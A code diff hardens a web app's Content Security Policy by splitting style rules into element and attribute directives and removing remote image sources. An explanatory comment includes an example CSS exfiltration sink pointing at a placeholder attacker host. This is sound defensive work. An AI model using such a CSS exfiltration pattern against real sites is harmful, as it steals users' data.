@@ -39,13 +39,28 @@ export function buildCsp(apiUrl) {
     // script-src costs nothing. Anything injected into the DOM cannot run.
     'script-src': ["'self'"],
 
-    // Inline *styles* are unavoidable — React style={{…}} and ag-grid both set
-    // style attributes on elements. Far lower risk than inline script: it can
-    // be abused to restyle the page, not to execute code.
+    // Inline *styles* cannot be removed: React style={{…}} and ag-grid set
+    // style attributes, and no nonce or hash can cover a style attribute —
+    // they apply to <style> elements only. This stays as the fallback for
+    // browsers that do not know the two finer-grained directives below, where
+    // it reproduces exactly the old behaviour rather than breaking the layout.
     'style-src': ["'self'", "'unsafe-inline'"],
 
-    // Posters may be hotlinked from anywhere; an image URL cannot execute.
-    'img-src': ["'self'", 'data:', 'https:'],
+    // Modern browsers get the precise version: stylesheet *elements* must be
+    // same-origin, so an injected <style> block is refused, while the style
+    // attributes the app genuinely needs still work. Verified against the real
+    // app: it adds zero <style> elements at runtime and links 3 same-origin
+    // stylesheets, so this costs nothing.
+    'style-src-elem': ["'self'"],
+    'style-src-attr': ["'unsafe-inline'"],
+
+    // No remote images: every film ships poster: null and the client draws a
+    // CSS gradient instead, so nothing is ever hotlinked. This is what makes
+    // inline styles safe to allow — CSS can only exfiltrate through a network
+    // sink like background-image: url(https://attacker/?stolen), and there is
+    // now no such origin to reach. Adding real poster URLs later means adding
+    // their host here, or images silently stop loading.
+    'img-src': ["'self'", 'data:'],
     'font-src': ["'self'", 'data:'],
 
     // Where the app is allowed to send data. Keeping this tight is what stops
